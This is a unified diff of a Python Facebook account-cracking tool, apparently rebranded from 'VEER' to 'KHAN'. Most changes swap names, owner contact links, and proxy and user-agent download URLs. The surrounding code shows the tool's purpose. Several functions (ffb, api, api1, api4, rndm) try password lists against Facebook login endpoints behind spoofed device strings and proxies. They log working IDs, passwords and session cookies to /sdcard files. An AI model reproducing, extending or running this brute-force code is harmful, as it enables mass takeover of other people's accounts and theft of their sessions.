@@ -19,18 +19,18 @@ try:
 except ModuleNotFoundError: 
 	print('\n Installing missing modules ...')
 	os.system('pip install requests bs4 futures==2 > /dev/null')
-	os.system('python VEER.py')
+	os.system('python K1.py')
 	
 	
  
  
 fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
 try:
-    prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
-    open('proxies.txt','w').write(proxies)
+    prox= requests.get('https://github.com/Badshawazir/K1/blob/main/Approvel.txt').text
+    open('Approvel.txt','w').write(proxies)
 except Exception as e:
     print('')
-proxies=open('proxies.txt','r').read().splitlines()
+proxies=open('Approvel.txt','r').read().splitlines()
 android_models=[]
 try:
     xx = requests.get('https://github.com/Badshawazir/K1/blob/main/Approvel.txt').text.splitlines()
@@ -39,7 +39,7 @@ try:
 except:pass
 usr=[]
 try:
-    xd=requests.get('https://github.com/Badshawazir/K1/blob/main/Approvel.txt').text.splitlines()
+    xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
     for us in xd:
         usr.append(us)
 except: pass
@@ -229,11 +229,11 @@ logo=(""" \033[1;37m ##     ##   ########  ########  ########
    \033[1;32m ## ##     ##        ##        ##     ##  
     \033[1;34m ###      ########  ########  ##      ##   
 \x1b[1;97m ---------------------------------------------
-\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Owner   :  MUDASSIR ALI
-\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Facebook:  VEER KHANOO
+\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Owner   :  RIZWAN KHAN
+\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Facebook:  KHANI DA BRO
 \x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Status  :  Paid
 \x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Tool    :  MIX
-\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Version : \x1b[1;92m0.6
+\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Version : \x1b[1;92m0.7
 \x1b[1;97m ----------------------------------------------
 \x1b[1;97m Please Free User WP Mai Msg Na kary Sorry Tang Na karna
 \033[1;37m==================================================== """  )
@@ -326,8 +326,8 @@ def main__manu():
                                 linex()
                                 print('\033[1;97m[•]\x1b[1;92m THE PROCESS HAS COMPLETED')
                                 print('\033[1;97m[•]\x1b[1;92m TOTAL OK/CP ACCOUNTS \x1b[1;91m:\x1b[1;92m '+str(len(oks))+'\033[1;37m/\033[1;31m'+str(len(cps)))
-                                print('\033[1;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/VEER-COOKIE.txt') 
-                                print('\033[1;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/VEER-OK.txt')
+                                print('\033[1;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/KHAN-COOKIE.txt') 
+                                print('\033[1;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/KHAN-OK.txt')
                                 linex()
                                 input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO BACK');clear();menu()
                         elif xd in ['2','02']:
@@ -346,15 +346,15 @@ def main__manu():
                                 else:
                                         print('\033[0;97m[•] \033[1;91mCHOOSE CORRECT OPTION');menu()
                         elif xd in ['3','03']:
-                                os.system('xdg-open https://www.facebook.com/veerkhano71');menu()
+                                os.system('xdg-open https://www.facebook.com/profile.php?id=100077537343092&mibextid=ZbWKwL');menu()
                         elif xd in ['4','04']:
-                        	     os.system('xdg-open https://chat.whatsapp.com/HjFjl6UTo3VFbT0wI7zNFN');menu()
+                        	     os.system('xdg-open https://wa.me/+923345478919');menu()
                         elif xd in ['0','00']:
                                 clear()
                                 print('\t\x1b[1;92m   EXIT FROM VEER TOOL')
                                 linex()
                                 input('\033[1;97m[•]\x1b[1;92m PRESS ENTER TO CONTACT OWNER ');clear() 
-                                os.system('xdg-open https://www.facebook.com/veerkhano71');print('\x1b[1;97m[•] \x1b[1;92mPROGRAM CLOSED THANKS FOR USE VEER TOOL');time.sleep(2);linex();exit() 
+                                os.system('xdg-open https://www.facebook.com/profile.php?id=100077537343092&mibextid=ZbWKwL');print('\x1b[1;97m[•] \x1b[1;92mPROGRAM CLOSED THANKS FOR USE VEER TOOL');time.sleep(2);linex();exit() 
                         else:
                                 print('\033[0;97m[•] \033[0;91mCHOOSE CORRECT OPTION');main__manu()
         except ValueError:
@@ -401,8 +401,8 @@ def pak():
                 linex()
                 print('\033[0;97m[•]\x1b[1;92m THE PROCESS HAS COMPLETED ')
                 print('\033[0;97m[•]\x1b[1;92m TOTAL OK/CP ACCOUNTS \x1b[1;91m:\x1b[1;92m '+str(len(oks))+'\033[1;37m/\033[1;31m'+str(len(cps)))
-                print('\033[0;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/VEER-rndm-COOKIE.txt') 
-                print('\033[0;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/VEER-rndm-OK.txt')
+                print('\033[0;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/KHAN-rndm-COOKIE.txt') 
+                print('\033[0;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/KHAN-rndm-OK.txt')
                 linex()
                 input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO BACK');clear()
                 main__menu()
@@ -490,7 +490,7 @@ def bd():
  
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m[VEER-M1]  %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m[KHAN-M1]  %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -532,15 +532,15 @@ def ffb(ids,names,passlist):
                         if "c_user" in VEER:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\x1b[1;92m[VEER-OK] %s | %s'%(ids,pas))
-                                open('/sdcard/VEER-OK.txt', 'a').write(ids+'|'+pas+'\n')
-                                open('/sdcard/VEER-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
+                                print(f'\r\r\x1b[1;92m[KHAN-OK] %s | %s'%(ids,pas))
+                                open('/sdcard/KHAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open('/sdcard/KHAN-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in VEER:
                                 if 'y' in pcp:
-                                        print('\r\r\x1b[1;93m[VEER-CP]  '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/VEER-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\x1b[1;93m[KHAN-CP]  '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/KHAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -556,7 +556,7 @@ xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT
  
 def api4(self,uid,first,last):
         global loop,oks,cps
-        sys.stdout.write('\\\33[1;37m [VEER-M4] %s|OK/%s CP/%s\33[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write('\\\33[1;37m [KHAN-M4] %s|OK/%s CP/%s\33[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -593,14 +593,14 @@ def api4(self,uid,first,last):
                         if "c_user" in VEER:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\\\33[1;32m [VEER-OK] %s | %s'%(ids,pas))
-                                open('/sdcard/VEER-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print('\\\33[1;32m [KHAN-OK] %s | %s'%(ids,pas))
+                                open('/sdcard/KHAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in VEER:
                                 if 'y' in pcp:
-                                        print('\r\r\x1b[1;93m[VEER-CP]  '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/VEER-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\x1b[1;93m[KHAN-CP]  '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/KHAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -663,15 +663,15 @@ def api(ids,names,passlist):
 				if "session_key" in q:
 					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
 					cookie = f"sb={sb};{coki}"
-					p('\r\033[1;92m[VEER-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[KHAN-OK] %s | %s \033[1;97m '%(uid,pw))
 					ok.append(uid)
-					open('/sdcard/VEER_M1_OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/VEER_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+					open('/sdcard/KHAN_M1_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/KHAN_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[VEER-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[KHAN-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
-					open('/sdcard/VEER_M1_CP.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/KHAN_M1_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				else:
 					continue
@@ -683,7 +683,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [VEER-KING-M3] %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [KHAN-KING-M3] %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -733,18 +733,18 @@ def api1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m[LEGEN-VEER-OK]  '+ids+' | '+pas+ ' '+joined(ids)+' ')
-                                        open('/sdcard/VEER-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m[LEGEN-KHAN-OK]  '+ids+' | '+pas+ ' '+joined(ids)+' ')
+                                        open('/sdcard/KHAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\033[1;91m [VEER-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/VEER-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\033[1;91m [KHAN-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/KHAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open('/sdcard/VEER-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/KHAN-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -769,7 +769,7 @@ print(rndUA())
 def rndm(ids,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [VEER-RANDOM] %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [KHAN-RANDOM] %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         for pas in passlist:
                                 application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                 application_version_code=str(random.randint(000000000,999999999))
@@ -815,16 +815,16 @@ def rndm(ids,passlist):
                                 if 'session_key' in q:
                                         uid=str(q['uid'])
                                         try:
-                                                okk=open('/sdcard/VEER-OK.txt','r').read()
+                                                okk=open('/sdcard/KHAN-OK.txt','r').read()
                                                 if uid in okk:pass
                                                 else:
-                                                        print('\r\r\033[1;32m [VEER-OK] '+uid+' | '+pas+'\033[1;97m')
-                                                        open('/sdcard/VEER-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                        print('\r\r\033[1;32m [KHAN-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                        open('/sdcard/KHAN-OK.txt','a').write(uid+'|'+pas+'\n')
                                                         oks.append(ids)
                                                         break
                                         except:
-                                                print('\r\r\033[1;32m [VEER-OK] '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/VEER-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                print('\r\r\033[1;32m [KHAN-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/KHAN-OK.txt','a').write(uid+'|'+pas+'\n')
                                                 oks.append(ids)
                                                 break
                                 else:
